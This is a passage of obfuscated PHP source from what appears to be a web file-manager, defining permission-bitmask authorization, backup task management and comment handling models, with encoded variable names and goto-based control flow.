$DÂ¯…ÀÍÊ =& $_SERVER[Æ]; $FíÃÊ¥´æ° = $this->getConfig(); $DÂñ¡ÚæÕ = KOD_VERSION . $DÂ¯…ÀÍÊ[91] . KOD_VERSION_BUILD; goto Bí‘ÇÊö»Å; Bí‘ÇÊö»Å: $bçÊ¾…‰Íï = $this->packageVersion(); $fÍçÒ‘Ú™Ô = $DÂñ¡ÚæÕ . $DÂ¯…ÀÍÊ[412] . $bçÊ¾…‰Íï; if (substr($b·¹‡¨Üç, 0, 4) == $DÂ¯…ÀÍÊ[144] || substr($b·¹‡¨Üç, 0, 2) == $DÂ¯…ÀÍÊ[1154]) { $EëÅ·‚Û« = $b·¹‡¨Üç . $DÂ¯…ÀÍÊ[1368] . $fÍçÒ‘Ú™Ô; } else { if ($aÉ¡ÌÔ²ïÙ == $DÂ¯…ÀÍÊ[33]) { $EëÅ·‚Û« = $this->pluginHost . $b·¹‡¨Üç . $DÂ¯…ÀÍÊ[1368] . $fÍçÒ‘Ú™Ô; } else { if ($aÉ¡ÌÔ²ïÙ === $DÂ¯…ÀÍÊ[76]) { $EëÅ·‚Û« = $this->pluginHost . $b·¹‡¨Üç; } else { if ($aÉ¡ÌÔ²ïÙ == $DÂ¯…ÀÍÊ[1369]) { $EëÅ·‚Û« = STATIC_PATH . $b·¹‡¨Üç . $DÂ¯…ÀÍÊ[1368] . $DÂñ¡ÚæÕ; } else { if ($aÉ¡ÌÔ²ïÙ == $DÂ¯…ÀÍÊ[1370]) { $EëÅ·‚Û« = APP_HOST . $DÂ¯…ÀÍÊ[1371] . $b·¹‡¨Üç . $DÂ¯…ÀÍÊ[1368] . $DÂñ¡ÚæÕ; } else { if (isset($FíÃÊ¥´æ°[$aÉ¡ÌÔ²ïÙ])) { $EëÅ·‚Û« = $FíÃÊ¥´æ°[$aÉ¡ÌÔ²ïÙ] . $b·¹‡¨Üç . $DÂ¯…ÀÍÊ[1368] . $fÍçÒ‘Ú™Ô; } } } } } } goto DëÑ¹‡¥íÄ; A†¶ãí²í: } public function link($b…¦·Ñé«Ä = false, $dÑÁôŒÀÈ‹ = '') { $FÚÀ„öŸ« =& $_SERVER[Æ]; if (!$b…¦·Ñé«Ä) { $this->link($FÚÀ„öŸ«[1372], $FÚÀ„öŸ«[1370]); $this->link($FÚÀ„öŸ«[1373], $FÚÀ„öŸ«[1369]); $this->link($FÚÀ„öŸ«[1374], $FÚÀ„öŸ«[1369]); $this->link($FÚÀ„öŸ«[1375], $FÚÀ„öŸ«[1369]); $this->link($FÚÀ„öŸ«[1376], $FÚÀ„öŸ«[1369]); return; } $BÉø‚Ç»£ë = $this->url($b…¦·Ñé«Ä, $dÑÁôŒÀÈ‹, !1); if (substr($b…¦·Ñé«Ä, -3) == $FÚÀ„öŸ«[1377]) { echo $FÚÀ„öŸ«[1378] . $BÉø‚Ç»£ë . $FÚÀ„öŸ«[1379] . $FÚÀ„öŸ«[217]; } else { if (substr($b…¦·Ñé«Ä, -4) == $FÚÀ„öŸ«[1380]) { echo $FÚÀ„öŸ«[1381] . $BÉø‚Ç»£ë . $FÚÀ„öŸ«[1382] . $FÚÀ„öŸ«[217]; } } } } goto a¦Áœ™; fİßÆ«¼¸°: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $EŞ÷¾ˆÊÕœ =& $_SERVER[Æ]; $B ”×ø¡Æ = array(array($EŞ÷¾ˆÊÕœ[386] => LNG($EŞ÷¾ˆÊÕœ[2102]), $EŞ÷¾ˆÊÕœ[2103] => $EŞ÷¾ˆÊÕœ[2104], $EŞ÷¾ˆÊÕœ[2105] => 6, $EŞ÷¾ˆÊÕœ[2106] => 1, $EŞ÷¾ˆÊÕœ[2107] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($EŞ÷¾ˆÊÕœ[386] => LNG($EŞ÷¾ˆÊÕœ[2108]), $EŞ÷¾ˆÊÕœ[2103] => $EŞ÷¾ˆÊÕœ[2109], $EŞ÷¾ˆÊÕœ[2105] => 1, $EŞ÷¾ˆÊÕœ[2106] => 1, $EŞ÷¾ˆÊÕœ[2107] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($EŞ÷¾ˆÊÕœ[386] => LNG($EŞ÷¾ˆÊÕœ[2110]), $EŞ÷¾ˆÊÕœ[2103] => $EŞ÷¾ˆÊÕœ[2111], $EŞ÷¾ˆÊÕœ[2105] => 2, $EŞ÷¾ˆÊÕœ[2106] => 1, $EŞ÷¾ˆÊÕœ[2107] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($EŞ÷¾ˆÊÕœ[386] => LNG($EŞ÷¾ˆÊÕœ[2112]), $EŞ÷¾ˆÊÕœ[2103] => $EŞ÷¾ˆÊÕœ[2111], $EŞ÷¾ˆÊÕœ[2105] => 3, $EŞ÷¾ˆÊÕœ[2106] => 1, $EŞ÷¾ˆÊÕœ[2107] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($EŞ÷¾ˆÊÕœ[386] => LNG($EŞ÷¾ˆÊÕœ[2113]), $EŞ÷¾ˆÊÕœ[2103] => $EŞ÷¾ˆÊÕœ[2114], $EŞ÷¾ˆÊÕœ[2105] => 4, $EŞ÷¾ˆÊÕœ[2106] => 1, $EŞ÷¾ˆÊÕœ[2107] => self::AUTH_SHOW | self::AUTH_VIEW), array($EŞ÷¾ˆÊÕœ[386] => LNG($EŞ÷¾ˆÊÕœ[2115]), $EŞ÷¾ˆÊÕœ[2103] => $EŞ÷¾ˆÊÕœ[2116], $EŞ÷¾ˆÊÕœ[2105] => 5, $EŞ÷¾ˆÊÕœ[2106] => 1, $EŞ÷¾ˆÊÕœ[2107] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($EŞ÷¾ˆÊÕœ[386] => LNG($EŞ÷¾ˆÊÕœ[2117]), $EŞ÷¾ˆÊÕœ[2103] => $EŞ÷¾ˆÊÕœ[2118], $EŞ÷¾ˆÊÕœ[2105] => 7, $EŞ÷¾ˆÊÕœ[2106] => 1, $EŞ÷¾ˆÊÕœ[2107] => 0)); return $B ”×ø¡Æ; } public static function authCheck($BØ°†ŠÏ©, $e¦Û£ĞÎ»Ã) { $BØ°†ŠÏ© = intval($BØ°†ŠÏ©); if (_get($GLOBALS, $_SERVER[Æ][457])) { return !0; } if ($BØ°†ŠÏ© <= 0) { return !1; } if (($BØ°†ŠÏ© & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($BØ°†ŠÏ© & $e¦Û£ĞÎ»Ã); } public static function authCheckShow($Eß†ÉêÛòİ) { return self::authCheck($Eß†ÉêÛòİ, self::AUTH_SHOW); } public static function authCheckView($dÂİ¦¥Á´) { return self::authCheck($dÂİ¦¥Á´, self::AUTH_VIEW); } public static function authCheckDownload($cèá…àñ¿×) { return self::authCheck($cèá…àñ¿×, self::AUTH_DOWNLOAD); } public static function authCheckUpload($b¨„”ö„øÒ) { return self::authCheck($b¨„”ö„øÒ, self::AUTH_UPLOAD); } public static function authCheckEdit($FÏòµêí¶») { return self::authCheck($FÏòµêí¶», self::AUTH_EDIT); } public static function authCheckRemove($B ‚Ò‡ÍÉ–) { return self::authCheck($B ‚Ò‡ÍÉ–, self::AUTH_REMOVE); } public static function authCheckShare($c£íŒœùŸ) { return self::authCheck($c£íŒœùŸ, self::AUTH_SHARE); } public static function authCheckComment($AÃ¨­·ò°) { return self::authCheck($AÃ¨­·ò°, self::AUTH_COMMENT); } public static function authCheckEvent($b¥‚Ö–¤ò×) { return self::authCheck($b¥‚Ö–¤ò×, self::AUTH_EVENT); } public static function authCheckRoot($dŸÙœ´•Ë¹) { return self::authCheck($dŸÙœ´•Ë¹, self::AUTH_ROOT); } public static function authDisable($Dõ§Óñš«©, $AÁˆê¢º¨§) { if (intval($Dõ§Óñš«©) <= 0) { return 0; } return intval($Dõ§Óñš«©) & ~$AÁˆê¢º¨§; } public $optionType = "\x53\171\x73\x74\x65\155\56\163\x6f\165\162\143\145\x41\x75\x74\x68\x4c\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x61\x75\x74\x68", "\154\x61\x62\145\154", "\x64\x69\163\x70\154\141\171", "\x73\171\x73\x74\145\x6d", "\x73\157\x72\164"); public function initData() { $cÏ—‹®øÌ‘ = $this->authDefault(); foreach ($cÏ—‹®øÌ‘ as $BÆãİöÊ¥) { $this->add($BÆãİöÊ¥); } } public function listData($f…¬…ÖŠ» = false, $AîÎƒ´Û†Ô = "\163\157\x72\164", $aÏ…ß’Â•÷ = false) { return parent::listData($f…¬…ÖŠ», $AîÎƒ´Û†Ô, $aÏ…ß’Â•÷); } public function update($d„Ò÷Áèßø, $Dˆ„„×ƒÂ›) { $E‰ô˜‘•ïÔ =& $_SERVER[Æ]; $A»ŒÁîõİŒ = parent::listData($d„Ò÷Áèßø); $cÉ·©äê•® = $this->findByName($Dˆ„„×ƒÂ›[$E‰ô˜‘•ïÔ[28]]); if (!$A»ŒÁîõİŒ || $cÉ·©äê•® && $cÉ·©äê•®[$E‰ô˜‘•ïÔ[367]] != $A»ŒÁîõİŒ[$E‰ô˜‘•ïÔ[367]]) { return !1; } $this->filterAuth($Dˆ„„×ƒÂ›[$E‰ô˜‘•ïÔ[376]]); return parent::update($d„Ò÷Áèßø, $Dˆ„„×ƒÂ›); } public function remove($C“¦¸ñÚôø) { $aç‡ˆÈÒšé = parent::listData($C“¦¸ñÚôø); if (!$aç‡ˆÈÒšé || $aç‡ˆÈÒšé[$_SERVER[Æ][1080]]) { return !1; } return parent::remove($C“¦¸ñÚôø); } public function add($c‘Ø‚ˆ† = array()) { goto D„ÓËñ«İˆ; F‹Ô«‘Ùºì: $c‘Ø‚ˆ† = array_merge($EÂƒ„”¬Ä, $c‘Ø‚ˆ†); $c‘Ø‚ˆ†[$Câ™º£ÚŒ[2122]] = $this->getSort(); $this->filterAuth($c‘Ø‚ˆ†[$Câ™º£ÚŒ[376]]); goto FéÍ¯¬Ìš‰; D„ÓËñ«İˆ: $Câ™º£ÚŒ =& $_SERVER[Æ]; if ($this->findByName($c‘Ø‚ˆ†[$Câ™º£ÚŒ[28]])) { return !1; } $EÂƒ„”¬Ä = array($Câ™º£ÚŒ[28] => $Câ™º£ÚŒ[33], $Câ™º£ÚŒ[376] => 1, $Câ™º£ÚŒ[2119] => $Câ™º£ÚŒ[2120], $Câ™º£ÚŒ[2121] => 1, $Câ™º£ÚŒ[1080] => 0, $Câ™º£ÚŒ[2122] => 0); goto F‹Ô«‘Ùºì; FéÍ¯¬Ìš‰: return parent::insert($c‘Ø‚ˆ†); goto dé„óé¨›š; dé„óé¨›š: } private function getSort() { $c²Å®‹Ø =& $_SERVER[Æ]; $bËè‚†ŞÇ = parent::listData(); $d©ˆÏäƒºÏ = array_to_keyvalue($bËè‚†ŞÇ, $c²Å®‹Ø[33], $c²Å®‹Ø[2122]); return empty($d©ˆÏäƒºÏ) ? 0 : max($d©ˆÏäƒºÏ) + 1; } private function filterAuth(&$DèìŸ÷×¯) { goto b”å‡ØÄÏ; b•½’İ§¯: foreach ($c«“ìÛŞ… as $CÒËÑ¨á¡) { if ($DèìŸ÷×¯ & $CÒËÑ¨á¡) { $c¡¤çÕèÀ[] = $CÒËÑ¨á¡; } } if (in_array(self::AUTH_ROOT, $c¡¤çÕèÀ)) { $DèìŸ÷×¯ = array_sum($c«“ìÛŞ…); return; } $DÚÛÑ„š™ù = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto FÀ…Ìô°¡¼; b”å‡ØÄÏ: if (!$DèìŸ÷×¯) { return; } $c«“ìÛŞ… = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $c¡¤çÕèÀ = array(); goto b•½’İ§¯; FÀ…Ìô°¡¼: foreach ($c¡¤çÕèÀ as $CÒËÑ¨á¡) { if (isset($DÚÛÑ„š™ù[$CÒËÑ¨á¡])) { $c¡¤çÕèÀ = array_merge($c¡¤çÕèÀ, $DÚÛÑ„š™ù[$CÒËÑ¨á¡]); } } $c¡¤çÕèÀ[] = self::AUTH_SHOW; $DèìŸ÷×¯ = array_sum(array_unique($c¡¤çÕèÀ)); goto A×Ôäè¥ÆÄ; A×Ôäè¥ÆÄ: } public function sort($Cìç—Åİç—, $FÖí”Í›Îë) { return parent::update($Cìç—Åİç—, $FÖí”Í›Îë); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\142\x61\x63\x6b\x75\x70\114\x69\x73\x74"; public $field = array("\x69\157", "\156\x61\155\145", "\163\164\x61\x74\165\163", "\143\157\x6e\164\x65\x6e\164", "\162\x65\x73\165\154\x74", "\164\151\x6d\x65\x46\162\x6f\x6d", "\164\151\x6d\x65\124\x6f"); public function config() { goto f»ùó±¢õ; BŞŒì‹­Œ: if (isset($d¾ó­ĞÑá[$DÜÉùİÂ¢[190]])) { $d¾ó­ĞÑá[$DÜÉùİÂ¢[190]] = json_decode($d¾ó­ĞÑá[$DÜÉùİÂ¢[190]], !0); } if (isset($F©‘ŒÜÛù±[$DÜÉùİÂ¢[190]])) { $d¾ó­ĞÑá[$DÜÉùİÂ¢[190]][$DÜÉùİÂ¢[1409]] = $F©‘ŒÜÛù±[$DÜÉùİÂ¢[190]]; unset($F©‘ŒÜÛù±[$DÜÉùİÂ¢[190]]); } return array_merge($d¾ó­ĞÑá, $F©‘ŒÜÛù±); goto f¯ˆ·¦’ë¦; e¢™Â’µ²: Action($DÜÉùİÂ¢[2123])->taskInit(); $C…¦º™ëøÖ = Model($DÜÉùİÂ¢[2124])->listData(); foreach ($C…¦º™ëøÖ as $Dç÷ğãöìâ) { if ($Dç÷ğãöìâ[$DÜÉùİÂ¢[1080]] == $DÜÉùİÂ¢[83] && $Dç÷ğãöìâ[$DÜÉùİÂ¢[1422]] == $DÜÉùİÂ¢[2125]) { $d¾ó­ĞÑá = $Dç÷ğãöìâ; break; } } goto BŞŒì‹­Œ; f»ùó±¢õ: $DÜÉùİÂ¢ =& $_SERVER[Æ]; $F©‘ŒÜÛù± = Model($DÜÉùİÂ¢[1088])->get($DÜÉùİÂ¢[712]); $F©‘ŒÜÛù± = json_decode($F©‘ŒÜÛù±, !0); goto a¯´‡ø²ƒ; a¯´‡ø²ƒ: $F©‘ŒÜÛù± = is_array($F©‘ŒÜÛù±) ? $F©‘ŒÜÛù± : array(); if (!isset($F©‘ŒÜÛù±[$DÜÉùİÂ¢[690]])) { $F©‘ŒÜÛù±[$DÜÉùİÂ¢[690]] = $DÜÉùİÂ¢[468]; } $d¾ó­ĞÑá = array(); goto e¢™Â’µ²; f¯ˆ·¦’ë¦: } public function listData($A¥ÆßçĞˆ = false, $b‚³¿·âê³ = "\x6d\157\144\151\146\x79\x54\151\x6d\145", $cô‘ÀõİÇ = false) { return parent::listData($A¥ÆßçĞˆ, $b‚³¿·âê³, !0); } public function lastItem() { $C˜Œº‚„¯‹ = $this->listData(); return !empty($C˜Œº‚„¯‹[0]) ? $C˜Œº‚„¯‹[0] : null; } public function kill($báå¨‡œ¶ğ) { goto F´Ê»Ÿ×Æ¹; C×ŒéñˆÃ: $E»¦¥¦Ò = $fé—¦Å¿×Õ[$FÃ¼¨öÈÃ[28]]; $f¹ŞÙ÷ÌôĞ = TEMP_FILES . $FÃ¼¨öÈÃ[708] . $E»¦¥¦Ò . $FÃ¼¨öÈÃ[8]; IO::remove($f¹ŞÙ÷ÌôĞ, !1); goto Aå¦ÊÌ‰Â; bİ¡Œîñ: Task::kill($FÃ¼¨öÈÃ[711]); Task::kill($FÃ¼¨öÈÃ[727]); Task::kill($FÃ¼¨öÈÃ[735]); goto C×ŒéñˆÃ; Aå¦ÊÌ‰Â: return $this->remove($báå¨‡œ¶ğ); goto FˆïË“ÏÀò; F´Ê»Ÿ×Æ¹: $FÃ¼¨öÈÃ =& $_SERVER[Æ]; $fé—¦Å¿×Õ = $this->listData($báå¨‡œ¶ğ); if (!$fé—¦Å¿×Õ || empty($fé—¦Å¿×Õ[$FÃ¼¨öÈÃ[28]])) { return !0; } goto bİ¡Œîñ; FˆïË“ÏÀò: } public function remove($AºÒõ­è¿Ÿ) { $FÍ·‰ ´ = $this->listData($AºÒõ­è¿Ÿ); if (!$FÍ·‰ ´) { return !0; } return $this->backupRemove($FÍ·‰ ´); } private function backupRemove($Fñ†™Áˆ) { $c¼šÑŸ«¥í =& $_SERVER[Æ]; parent::remove($Fñ†™Áˆ[$c¼šÑŸ«¥í[367]]); $EÒšİ‰Ë = "\173\x69\x6f\72{$Fñ†™Áˆ[$c¼šÑŸ«¥í[689]]}\175\x2f\144\141\164\141\x62\x61\163\x65\57\142\141\x63\153\165\160\x5f" . $Fñ†™Áˆ[$c¼šÑŸ«¥í[28]]; IO::remove($EÒšİ‰Ë, !1); return !0; } public function start() { goto EˆÅß‡Ï‰; e”£´±ÛÖ: return !0; goto FÌã¡¬¼°å; DÍ„øÆğØê: $c¶¼™·ƒËô = new Backup(); $c¶¼™·ƒËô->keep(); if (!$c¶¼™·ƒËô->db()) { return !1; } goto Dğô©‰øĞ; AÓ°–ÄÖ¯Ñ: if (!$EÖ¶ã£±ÌĞ || $EÖ¶ã£±ÌĞ[$EÁ„×ÚŒ¡[1406]] != $EÁ„×ÚŒ¡[83]) { return !1; } $BŸ•á”õäã = $this->process(); foreach ($BŸ•á”õäã as $CÁÇˆ®±Á‘) { if ($CÁÇˆ®±Á‘) { return Task::restart($CÁÇˆ®±Á‘[$EÁ„×ÚŒ¡[367]]); } } goto DÍ„øÆğØê; EˆÅß‡Ï‰: $EÁ„×ÚŒ¡ =& $_SERVER[Æ]; if ($GLOBALS[$EÁ„×ÚŒ¡[6]][$EÁ„×ÚŒ¡[84]][$EÁ„×ÚŒ¡[2126]] != $EÁ„×ÚŒ¡[83]) { return !0; } $EÖ¶ã£±ÌĞ = $this->config(); goto AÓ°–ÄÖ¯Ñ; Dğô©‰øĞ: if (!$c¶¼™·ƒËô->dbFile()) { return !1; } if ($EÖ¶ã£±ÌĞ[$EÁ„×ÚŒ¡[690]] == $EÁ„×ÚŒ¡[468]) { $c¶¼™·ƒËô->file(); } Backup::set(array($EÁ„×ÚŒ¡[687] => 1, $EÁ„×ÚŒ¡[701] => time())); goto e”£´±ÛÖ; FÌã¡¬¼°å: } public function process() { $f¢Í«„êİ… =& $_SERVER[Æ]; return array($f¢Í«„êİ…[692] => Task::get($f¢Í«„êİ…[711]), $f¢Í«„êİ…[695] => Task::get($f¢Í«„êİ…[727]), $f¢Í«„êİ…[167] => Task::get($f¢Í«„êİ…[735])); } public function restore() { $cˆŒÀ‹ô“ =& $_SERVER[Æ]; ActionCall($cˆŒÀ‹ô“[2127], !0, 1); ActionCall($cˆŒÀ‹ô“[2127], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\145\156\164"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\155\x65" => "\x63\157\155\155\x65\x6e\164\x5f\155\145\x74\141", "\x6d\x65\164\x61\106\151\145\x6c\144" => "\x63\157\x6d\155\145\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($aˆöƒ˜ç˜) { $F¨¦÷²Ü¢° =& $_SERVER[Æ]; if ($aˆöƒ˜ç˜[$F¨¦÷²Ü¢°[2128]]) { $ağÆ„ë½ñÏ = $this->where(array($F¨¦÷²Ü¢°[2129] => $aˆöƒ˜ç˜[$F¨¦÷²Ü¢°[2128]]))->find(); if (!$ağÆ„ë½ñÏ || $ağÆ„ë½ñÏ[$F¨¦÷²Ü¢°[371]] != $aˆöƒ˜ç˜[$F¨¦÷²Ü¢°[371]] || $ağÆ„ë½ñÏ[$F¨¦÷²Ü¢°[456]] != $aˆöƒ˜ç˜[$F¨¦÷²Ü¢°[456]]) { return !1; } $this->where(array($F¨¦÷²Ü¢°[2129] => $aˆöƒ˜ç˜[$F¨¦÷²Ü¢°[2128]]))->setAdd($F¨¦÷²Ü¢°[2130], 1); } return $this->add($aˆöƒ˜ç˜); } public function remove($Eæ’°¥óÊƒ) { $c†“çÚÒƒ =& $_SERVER[Æ]; $d‹Ûæ‚ì¶ = array($c†“çÚÒƒ[2129] => $Eæ’°¥óÊƒ); $C‚Š¶ÚÁÉ£ = $this->where($d‹Ûæ‚ì¶)->find(); if ($C‚Š¶ÚÁÉ£[$c†“çÚÒƒ[2128]]) { $this->where(array($c†“çÚÒƒ[2129] => $C‚Š¶ÚÁÉ£[$c†“çÚÒƒ[2128]]))->setAdd($c†“çÚÒƒ[2130], -1); } return $this->where($d‹Ûæ‚ì¶)->delete(); } public function edit($e°í¬‰ÚÂñ, $E‰ÌØòŠßĞ) { $AÂŠØªÜÖ =& $_SERVER[Æ]; $d¶øÑÏà¸³ = array($AÂŠØªÜÖ[2129] => $e°í¬‰ÚÂñ); return $this->where($d¶øÑÏà¸³)->save(array($AÂŠØªÜÖ[2131] => $E‰ÌØòŠßĞ)); } public function prasise($BËØ˜ÏÉ) { $A›…ìãÜéø =& $_SERVER[Æ]; $Eãöù¶ğ¾£ = Model($A›…ìãÜéø[2132]); $C¢°ÂÜÌÒ‡ = array($A›…ìãÜéø[2129] => $BËØ˜ÏÉ, $A›…ìãÜéø[1425] => USER_ID); $D†Ê¸¢Ã±ƒ = $Eãöù¶ğ¾£->where($C¢°ÂÜÌÒ‡)->find(); if (!$D†Ê¸¢Ã±ƒ) { $Eãöù¶ğ¾£->add($C¢°ÂÜÌÒ‡); $EÛ®Ë¼„õï = $this->where(array($A›…ìãÜéø[2129] => $BËØ˜ÏÉ))->setAdd($A›…ìãÜéø[2133], 1); } else { $Eãöù¶ğ¾£->where($C¢°ÂÜÌÒ‡)->delete(); $EÛ®Ë¼„õï = $this->where(array($A›…ìãÜéø[2129] => $BËØ˜ÏÉ))->setAdd($A›…ìãÜéø[2133], -1); } return $EÛ®Ë¼„õï; } public function targetInfo($aƒ‹ˆ¼¥à, $bÇ»©Ï¢É¼) { goto C·Ü´Èò; DÚ¼…„¯ß: $A¿Ìªè®¶ó = "\122\x49\x47\x48\x54\40\112\117\x49\116\x20{$this->tablePrefix}\x63\157\x6d\155\145\156\164\x5f\x70\162\x61\x69\x73\145\x20\x73\164\141\x72\x20\157\156\40\x63\157\155\155\145\156\x74\x2e\143\x6f\x6d\155\145\156\164\x49\104\40\75\40\x73\x74\x61\162\56\x63\157\155\155\145\156\x74\111\x44"; $CèÂÉéâ = $this->alias($C¤Ü„”¶Ğ²[341])->where($eÂˆ°¨®É)->join($A¿Ìªè®¶ó, $C¤Ü„”¶Ğ²[2134])->count(); $FíìÃÉŠÉë = array($C¤Ü„”¶Ğ²[2135] => $C—…Íªœ—ß, $C¤Ü„”¶Ğ²[2136] => $CèÂÉéâ); goto fŒ†ÓÑ¬È‡; C·Ü´Èò: $C¤Ü„”¶Ğ² =& $_SERVER[Æ]; $eÂˆ°¨®É = array($C¤Ü„”¶Ğ²[521] => $aƒ‹ˆ¼¥à, $C¤Ü„”¶Ğ²[522] => $bÇ»©Ï¢É¼); $C—…Íªœ—ß = $this->where($eÂˆ°¨®É)->count(); goto DÚ¼…„¯ß; fŒ†ÓÑ¬È‡: return $FíìÃÉŠÉë; goto d™ªÕĞŠÕÃ; d™ªÕĞŠÕÃ: } public function listData($e½Âà¨Âå¡) { $cĞœ¸ î©‡ =& $_SERVER[Æ]; if (isset($e½Âà¨Âå¡[$cĞœ¸ î©‡[2137]])) { if ($e½Âà¨Âå¡[$cĞœ¸ î©‡[2137]]) { $e½Âà¨Âå¡[$cĞœ¸ î©‡[2138]] = array($cĞœ¸ î©‡[929], intval($e½Âà¨Âå¡[$cĞœ¸ î©‡[2137]])); } unset($e½Âà¨Âå¡[$cĞœ¸ î©‡[2137]]); } if (isset($e½Âà¨Âå¡[$cĞœ¸ î©‡[2139]])) { if ($e½Âà¨Âå¡[$cĞœ¸ î©‡[2139]]) { $e½Âà¨Âå¡[$cĞœ¸ î©‡[2138]] = array($cĞœ¸ î©‡[926], intval($e½Âà¨Âå¡[$cĞœ¸ î©‡[2139]])); } unset($e½Âà¨Âå¡[$cĞœ¸ î©‡[2139]]); } return $this->_listData($e½Âà¨Âå¡); } private function _listData($D¦³à‘ßÄ) { $AÙõœÏò =& $_SERVER[Æ]; $e°Èš‰íÛä = $this->where($D¦³à‘ßÄ)->_makeOrder()->selectPage(100); $this->_listAppendParent($e°Èš‰íÛä[$AÙõœÏò[354]]); $this->_listAppendUser($e°Èš‰íÛä[$AÙõœÏò[354]]); $this->_listAppendMeta($e°Èš‰íÛä[$AÙõœÏò[354]]); return $e°Èš‰íÛä; } private function _makeOrder() { $a„Çİô†´¨ =& $_SERVER[Æ]; $f¢î·ÂÏ®÷ = array($a„Çİô†´¨[2133], $a„Çİô†´¨[2130], $a„Çİô†´¨[187]); $d‚ÖÖŒÉ¨ = Input::get($a„Çİô†´¨[407], $a„Çİô†´¨[7], $a„Çİô†´¨[389], $f¢î·ÂÏ®÷); $AŞá¶¢ = Input::get($a„Çİô†´¨[408], $a„Çİô†´¨[7], $a„Çİô†´¨[1427], array($a„Çİô†´¨[2140], $a„Çİô†´¨[405])); $EŒ¦‹î¹›Ã = $d‚ÖÖŒÉ¨ . $a„Çİô†´¨[50] . $AŞá¶¢; return $this->order($EŒ¦‹î¹›Ã); } private function _listAppendParent(&$EÅİÌö›¦è) { goto fîÂ§¼è²ó; AŒ‚¥ğÀå‘: if (!$E»ÏÂ¦ŞÃ) { return; } $E…îñ„Ã„ = $this->where(array($eæ²–”¯İÕ[2129] => array($eæ²–”¯İÕ[7], $E»ÏÂ¦ŞÃ)))->select(); $E…îñ„Ã„ = array_to_keyvalue($E…îñ„Ã„, $eæ²–”¯İÕ[2138]); goto B‰‘Ì’ÙÆ; fîÂ§¼è²ó: $eæ²–”¯İÕ =& $_SERVER[Æ]; $E»ÏÂ¦ŞÃ = array_unique(array_to_keyvalue($EÅİÌö›¦è, $eæ²–”¯İÕ[33], $eæ²–”¯İÕ[2128])); $E»ÏÂ¦ŞÃ = array_remove_value($E»ÏÂ¦ŞÃ, $eæ²–”¯İÕ[468]); goto AŒ‚¥ğÀå‘; B‰‘Ì’ÙÆ: foreach ($EÅİÌö›¦è as &$A»öë²ÊÑ·) { if (isset($E…îñ„Ã„[$A»öë²ÊÑ·[$eæ²–”¯İÕ[2128]]])) { $A»öë²ÊÑ·[$eæ²–”¯İÕ[2141]] = $E…îñ„Ã„[$A»öë²ÊÑ·[$eæ²–”¯İÕ[2128]]]; } } goto C¸±§Ë­Íí; C¸±§Ë­Íí: } private function _listAppendUser(&$d­ˆÜ˜«…‘) { goto D’ò„ä÷¾á; D’ò„ä÷¾á: $f´—à³ È¥ =& $_SERVER[Æ]; $fõš¨œöÖõ = array_unique(array_to_keyvalue($d­ˆÜ˜«…‘, $f´—à³ È¥[33], $f´—à³ È¥[1434])); $fõš¨œöÖõ = array_remove_value($fõš¨œöÖõ, $f´—à³ È¥[468]); goto B…±ÄÍ­øµ; cç¹îÔ“Ëå: foreach ($d­ˆÜ˜«…‘ as &$Bğ³§Ë…‰Õ) { $Bğ³§Ë…‰Õ[$f´—à³ È¥[535]] = $b¥—æ”“ªÉ[$Bğ³§Ë…‰Õ[$f´—à³ È¥[1434]]]; if (isset($Bğ³§Ë…‰Õ[$f´—à³ È¥[2141]])) { $Bğ³§Ë…‰Õ[$f´—à³ È¥[2141]][$f´—à³ È¥[535]] = $b¥—æ”“ªÉ[$Bğ³§Ë…‰Õ[$f´—à³ È¥[2141]][$f´—à³ È¥[1434]]]; } } goto cáâºË‰ï„; B…±ÄÍ­øµ: if (count($fõš¨œöÖõ) == 0) { return; } foreach ($d­ˆÜ˜«…‘ as $Bğ³§Ë…‰Õ) { if (isset($Bğ³§Ë…‰Õ[$f´—à³ È¥[2141]])) { $fõš¨œöÖõ[] = $Bğ³§Ë…‰Õ[$f´—à³ È¥[2141]][$f´—à³ È¥[1434]]; } } $b¥—æ”“ªÉ = Model($f´—à³ È¥[477])->userListInfo($fõš¨œöÖõ); goto cç¹îÔ“Ëå; cáâºË‰ï„: } private function _listAppendMeta(&$e‘²ÎèîÑ) { goto c‡‘ù‰ç”; c‡‘ù‰ç”: $dö×‡õòò =& $_SERVER[Æ]; $cîŒùå£ = 